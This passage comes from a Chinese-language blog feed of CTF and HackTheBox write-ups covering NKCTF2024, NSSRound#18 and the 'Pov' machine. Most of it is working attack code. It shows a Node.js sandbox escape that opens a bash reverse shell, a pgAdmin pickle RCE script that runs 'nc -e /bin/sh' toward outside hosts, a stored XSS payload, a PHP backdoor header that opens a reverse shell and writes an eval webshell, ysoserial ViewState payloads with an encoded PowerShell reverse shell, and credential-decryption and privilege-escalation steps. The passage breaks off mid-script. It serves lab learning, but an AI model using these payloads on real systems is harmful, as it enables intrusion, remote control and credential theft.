<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="line">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>而本题过滤了很多，我们可以用replace函数来绕过对process的检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const p = (cc.constructor.constructor(&#x27;return proAcess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;)))();</span><br><span class="line">const obj=p.mainModule.require(&#x27;child_process&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br></pre></td></tr></table></figure>

<p>接下来是最为精彩的一步，利用javascript内置函数去返回一个属性描述符（PropertyDescriptor）对象，其中包括value也就是属性值</p>
<p>最终payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return procAess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;)))();</span><br><span class="line">			const obj = p.mainModule.require(&#x27;child_procAess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br><span class="line">			const ex = Object.getOwnPropertyDescriptor(obj,&#x27;exeAcSync&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br><span class="line">			return ex.value(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&quot;&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>成功反弹shell，执行<code>/readflag</code>得到flag</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325213907880.png"></p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p><a href="https://c1oudfl0w0.github.io/blog/2024/03/23/NKCTF2024/">参考文章</a></p>
<p>我们注意下面代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">    if(process.__filename == null) &#123;</span><br><span class="line">        let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>如果<code>process.__filename</code>为null则回显源码，我们可以利用原型链污染<code>__filename</code>实现任意文件读取</p>
<p>本解法利用反射去得到process对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        const c = arguments.callee.caller</span><br><span class="line">        const p = (c.constructor.constructor(&quot;return Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;pro&#x27;)))&quot;))()</span><br><span class="line">        return p.__filename=&quot;/etc/passwd&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>然后访问 &#x2F;secret 即可成功读取</p>
<p>尝试读&#x2F;flag，返回permission denied, open ‘&#x2F;flag’，没权限直接读</p>
<p>尝试读<code>./hack</code>，注意路径是<code>/app/hack.js</code>，提示<code>shell.js</code>跟进一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(&quot;shell&quot;); const p = require(&#x27;child_process&#x27;); p.execSync(process.env.command);</span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        const c = arguments.callee.caller;</span><br><span class="line">        const p = (c.constructor.constructor(&quot;return Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;pro&#x27;)))&quot;))();</span><br><span class="line">        p.env.command=&quot;whoami&quot;;</span><br><span class="line">        return p.mainModule.require(&quot;./shell&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a>attack_tacooooo</h2><blockquote>
<p>pgAdmin CVE-2024-2044</p>
</blockquote>
<p>猜测出用户和密码<code>tacooooo@qq.com tacooooo</code></p>
<p>登陆后发现是pgAdmin 4，搜索一番发现有个很新的漏洞 <a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">参考文章</a></p>
<p>poc.py如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b&#x27;\x80\x04\x95&#x27;</span><br><span class="line">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class="line">    b += b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b&#x27;\x94\x85\x94R\x94.&#x27;</span><br><span class="line">    print(b)</span><br><span class="line">    return b</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # if len(sys.argv) != 2:</span><br><span class="line">    #     exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class="line">    # with open(&#x27;nt.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    #     f.write(produce_pickle_bytes(&#x27;nt&#x27;, f&quot;nc 115.236.153.172 41678 -e /bin/sh&quot;))</span><br><span class="line">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;nc 5i781963p2.yicp.fun 58265 -e /bin/sh&quot;))</span><br></pre></td></tr></table></figure>

<p>直接<code>python3 poc.py</code>生成pickle文件（这里kali不行，用了其他师傅的Ubuntu生成的）</p>
<p>上传成功后，修改cookie为<code>pga4_session=/var/lib/pgadmin/storage/tacooooo_qq.com/posix.pickle!a</code></p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325235724144.png"></p>
<p>然后成功反弹shell，在<code>proc/1/environ</code>找到flag</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240326001639956.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSRound#18 Basic</title>
    <url>/article/NSSRound-18-Basic.html</url>
    <content><![CDATA[<p>session伪造、perl_startup提权</p>
<span id="more"></span>

<h2 id="门酱想玩什么呢？"><a href="#门酱想玩什么呢？" class="headerlink" title="门酱想玩什么呢？"></a>门酱想玩什么呢？</h2><p>打开题目，加载完视频后要求我们给个游戏链接</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151412487.png"></p>
<p>点开评论区不难发现应该是想玩元梦之星，这里有个评论功能可以上传图片</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151551692.png"></p>
<p>我们随便输入点东西发现是插入并赋值到content元素里面</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151833094.png"></p>
<p>猜测是存储型xss，我们去看看hint访问下<code>/nssctfroundSpring.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//部分关键代码</span><br><span class="line">$contentLines = explode(&quot; &quot;, $comment[&#x27;content&#x27;]);</span><br><span class="line">if (preg_match(&#x27;/^https?:\/\/\S+$/&#x27;, $contentLines[0])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;, $contentLines[0], $matches) &amp;&amp; end($contentLines) === &#x27;/png&#x27;) &#123;</span><br><span class="line">        $urlParts = parse_url($matches[0]);</span><br><span class="line">        if ($urlParts !== false) &#123;</span><br><span class="line">            echo &#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27; . $matches[0] . &#x27;&quot;&gt;&#x27;;</span><br><span class="line">            //.......</span><br><span class="line">        &#125;</span><br><span class="line">        //......</span><br><span class="line">    &#125;</span><br><span class="line">    //......</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>大概就是对评论的图片链接格式的过滤</p>
<p>我们要跳转到元梦之星用到location去跳转，最基础的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152704432.png"></p>
<p>然后按照上文的匹配条件修改一下以及闭合前面的<code>&lt;</code>和<code>&quot;</code>，最终构如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&quot;&gt;&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;.png /png</span><br></pre></td></tr></table></figure>

<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152541734.png"></p>
<p>成功跳转元梦之星</p>
<p>然后就是如何给门酱一个链接</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152846028.png"></p>
<p>也就是说需要门酱自己网站的链接去跳转，由于我们通过xss语句已经插入到img的src中实现跳转到元梦之星</p>
<p>所以我们只需要抓包跳转时的界面，就可以得到门酱跳转时的请求参数值</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153152573.png"></p>
<p>拼接上题目路径即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28757/words/?title=cmV2MXZl&amp;content=aHR0cCUzQSUyRiUyRiUyMiUzRSUzQ3NjcmlwdCUzRWRvY3VtZW50LmxvY2F0aW9uJTNEJTIyaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyMiUzQyUyRnNjcmlwdCUzRS5wbmclMjAlMkZwbmc%3D</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153311602.png"></p>
<h2 id="Becomeroot"><a href="#Becomeroot" class="headerlink" title="Becomeroot"></a>Becomeroot</h2><p>打开题目提示在&#x2F;root里面，应该是最后要提权</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123434018.png"></p>
<p>按照提示和php开发仓库入侵有关，搜出来刚好是对应题目php版本，可以利用<strong>User-Agentt</strong>头来命令执行 <a href="https://forum.butian.net/index.php/share/553">参考文章</a></p>
<p>我们bp抓包，构造如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>



<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123828640.png"></p>
<p>反弹成功，接下来尝试sh脚本提权发现不行</p>
<p>提示说和sudo提权有关，刚刚试了<code>sudo -l -S</code>是需要密码的所以肯定是存在提权漏洞</p>
<p>搜出来<code>CVE-2021-3156</code></p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124217000.png"></p>
<p>nc连接的靶机上传脚本比较麻烦，所以我们写马利用蚁剑上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;&gt;/var/www/html/shell.php&quot;);</span><br></pre></td></tr></table></figure>

<p><a href="https://gitcode.com/Rvn0xsy/CVE-2021-3156-plus/overview">漏洞exp利用链接</a></p>
<p>上传成功</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124426238.png"></p>
<p>然后再nc连接，成功提权</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124529389.png"></p>
<p>得到flag</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124558684.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>Pov-HackTheBox</title>
    <url>/article/Pov-HackTheBox.html</url>
    <content><![CDATA[<p>AST.NET框架ViewState参数攻击、LFI本地文件包含漏洞、ysoserial反序列化漏洞、SeDebugPrivilege提权</p>
<span id="more"></span>

<h1 id="Pov-HackTheBox"><a href="#Pov-HackTheBox" class="headerlink" title="Pov-HackTheBox"></a>Pov-HackTheBox</h1><p><strong>信息搜集</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.251</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE    VERSION</span><br><span class="line">80/tcp open  tcpwrapped</span><br><span class="line">|_http-title: pov.htb</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br></pre></td></tr></table></figure>

<p>我们将域名<code>pov.htb</code>添加到<code>/etc/hosts</code>方便访问</p>
<p>打开后发现是企业网站，扫出来子域名<code>dev.pov.htb</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:             http://pov.htb</span><br><span class="line">[+] Method:          GET</span><br><span class="line">[+] Threads:         10</span><br><span class="line">[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line">[+] User Agent:      gobuster/3.6</span><br><span class="line">[+] Timeout:         10s</span><br><span class="line">[+] Append Domain:   true</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in VHOST enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Found: dev.pov.htb Status: 302 [Size: 152] [--&gt; http://dev.pov.htb/portfolio/]</span><br></pre></td></tr></table></figure>

<p>那么我们修改下<code>/etc/hosts</code>的域名，成功访问</p>
<p>我们注意到有文件下载功能，尝试文件读取</p>
<p><img src="/article/Pov-HackTheBox/image-20240405172354851.png"></p>
<p>但是并不能读取一些常见的敏感文件路径</p>
<p><img src="/article/Pov-HackTheBox/image-20240405173617729.png"></p>
<p>我们利用<code>wappalyzer</code>插件扫描出web框架为<code>AST.NET</code>的4.0版本，并且上述请求中的参数也是相关联</p>
<p><img src="/article/Pov-HackTheBox/image-20240405174707954.png"></p>
<p>网上搜到<code>如何利用__VIEWSTATE</code> <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter?source=post_page-----7516c938c688--------------------------------">参考文章</a></p>
<p><strong>什么是 ViewState</strong></p>
<blockquote>
<p>ViewState 是 ASP.NET 中用于维护页面和控制网页数据的默认机制。在呈现页面的 HTML 期间，页面的当前状态和回发期间要保留的值将序列化为 base64 编码的字符串。然后，这些字符串将放置在隐藏的 ViewState 字段中。</p>
</blockquote>
<p>ViewState 信息可以通过以下属性或其组合来表征：</p>
<ul>
<li><p>基数64：当 <code>EnableViewStateMac</code> 和 <code>ViewStateEncryptionMode</code> 属性都设置为 false 时，将使用此格式。</p>
</li>
<li><p>Base64 + MAC（消息认证码）已启用：通过将 <code>EnableViewStateMac</code> 属性设置为 true 来实现 MAC 的激活。这为 ViewState 数据提供完整性验证。</p>
</li>
<li><p>Base64 + 加密：当 <code>ViewStateEncryptionMode</code> 属性设置为 true 时，将应用加密，以确保 ViewState 数据的机密性。</p>
</li>
</ul>
<p>文章提到在版本<code>4.5</code>以及<code>EnableViewStateMac=true &amp; ViewStateEncryptionMode=false</code>情况下，密钥在<code>web.config</code>文件上</p>
<p>（由于<code>../</code>被过滤，直接双写绕过）</p>
<p><img src="/article/Pov-HackTheBox/image-20240405185300956.png"></p>
<p>web.config</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.web&gt;</span><br><span class="line">    &lt;customErrors mode=&quot;On&quot; defaultRedirect=&quot;default.aspx&quot; /&gt;</span><br><span class="line">    &lt;httpRuntime targetFramework=&quot;4.5&quot; /&gt;</span><br><span class="line">    &lt;machineKey decryption=&quot;AES&quot; decryptionKey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; validation=&quot;SHA1&quot; validationKey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot; /&gt;</span><br><span class="line">  &lt;/system.web&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;httpErrors&gt;</span><br><span class="line">            &lt;remove statusCode=&quot;403&quot; subStatusCode=&quot;-1&quot; /&gt;</span><br><span class="line">            &lt;error statusCode=&quot;403&quot; prefixLanguageFilePath=&quot;&quot; path=&quot;http://dev.pov.htb:8080/portfolio&quot; responseMode=&quot;Redirect&quot; /&gt;</span><br><span class="line">        &lt;/httpErrors&gt;</span><br><span class="line">        &lt;httpRedirect enabled=&quot;true&quot; destination=&quot;http://dev.pov.htb/portfolio&quot; exactDestination=&quot;false&quot; childOnly=&quot;true&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用 YSoSerial.Net 攻击 <a href="https://github.com/pwntester/ysoserial.net">工具链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping 10.10.14.46&quot; --apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>

<p>注意：如果有发送参数 <code>_VIEWSTATEGENERATOR</code> ，用 <code>--generator=8E0F0FA3</code> 替换<code>--apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot;</code>。实际上bp抓包可以看到确实有，但是换成<code>--generator</code>参数却不行</p>
<p>在windows系统生成payload</p>
<p><img src="/article/Pov-HackTheBox/image-20240405192312405.png"></p>
<p>复制到bp上，并且在本地监听tun0（即10.10.14.46）的流量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i tun0 icmp</span><br></pre></td></tr></table></figure>

<p>成功命令执行</p>
<p><img src="/article/Pov-HackTheBox/image-20240405192620484.png"></p>
<p>经过一番尝试，发现bash的反弹shell无法成功，那么猜测是目标机器为windows</p>
<p>用powershell去弹 <a href="https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58#file-mkpsrevshell-py">脚本链接</a></p>
<p><img src="/article/Pov-HackTheBox/image-20240405194230876.png"></p>
<p>然后再生成payload放到bp上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA2ACIALAAxADAAMgA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot; --apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<p><img src="/article/Pov-HackTheBox/image-20240405194432185.png"></p>
<p>经过一番查找在<code>C:\Users\sfitz\Documents</code>路径下发现有用信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span><br><span class="line">  &lt;Obj RefId=&quot;0&quot;&gt;</span><br><span class="line">    &lt;TN RefId=&quot;0&quot;&gt;</span><br><span class="line">      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;</span><br><span class="line">      &lt;T&gt;System.Object&lt;/T&gt;</span><br><span class="line">    &lt;/TN&gt;</span><br><span class="line">    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;</span><br><span class="line">    &lt;Props&gt;</span><br><span class="line">      &lt;S N=&quot;UserName&quot;&gt;alaading&lt;/S&gt;</span><br><span class="line">      &lt;SS N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;</span><br><span class="line">    &lt;/Props&gt;</span><br><span class="line">  &lt;/Obj&gt;</span><br><span class="line">&lt;/Objs&gt;</span><br></pre></td></tr></table></figure>

<p>利用powershell语法解密将password转换成明文 <a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#secure-string-to-plaintext">参考文章</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *</span><br></pre></td></tr></table></figure>

<p>成功得到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\sfitz\Documents&gt; $cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *</span><br><span class="line">UserName       : alaading</span><br><span class="line">Password       : f8gQ8fynP44ek1m3</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : </span><br></pre></td></tr></table></figure>

<p>接下来我们使用RunasCs进行用户切换</p>
<p>首先切换到Downloads目录，然后下载本地的RunasCs文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/RunasCs.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/Pov-HackTheBox/image-20240405200822175.png"></p>
<p>然后切换用户并弹shell到777端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.46:777</span><br></pre></td></tr></table></figure>

<p>重点：这里用<code>powershell</code>弹，如果用<code>cmd.exe</code>到后面会发现没有<code>SeDebugPrivilege</code>权限</p>
<p><img src="/article/Pov-HackTheBox/image-20240405200949897.png"></p>
<p>得到user的flag</p>
<p><img src="/article/Pov-HackTheBox/image-20240405201600635.png"></p>
<p>查看下当前用户权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State   </span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeDebugPrivilege              Debug programs                 Enabled </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>

<p><strong>SeDebugPrivilege</strong></p>
<blockquote>
<p>在Windows操作系统中，SeDebugPrivilege是一种特别强大的权限，可以让持有该权限的进程读取或修改几乎所有其他进程的内存空间，即使是那些以系统或管理员级别运行的进程。在Metasploit框架下，拥有了这个权限，就可以对系统的SAM数据库进行读取</p>
</blockquote>
<p>由于靶机<code>SeDebugPrivilege</code>是<code>enabled</code>，所以我们就直接提权就行了</p>
<p>若要启动该权限，需要执行下面脚本 <a href="https://book.hacktricks.xyz/v/cn/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#qi-yong-suo-you-ling-pai">参考文章</a></p>
<p>EnableAllTokenPrivs.ps1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## All Credit goes to Lee Holmes (@Lee_Holmes on twitter).  I found the code here https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/</span><br><span class="line">$definition = @&#x27;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace Set_TokenPermission</span><br><span class="line">&#123;</span><br><span class="line">    public class SetTokenPriv</span><br><span class="line">    &#123;</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,</span><br><span class="line">        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, SetLastError = true)]</span><br><span class="line">        internal static extern bool LookupPrivilegeValue(string 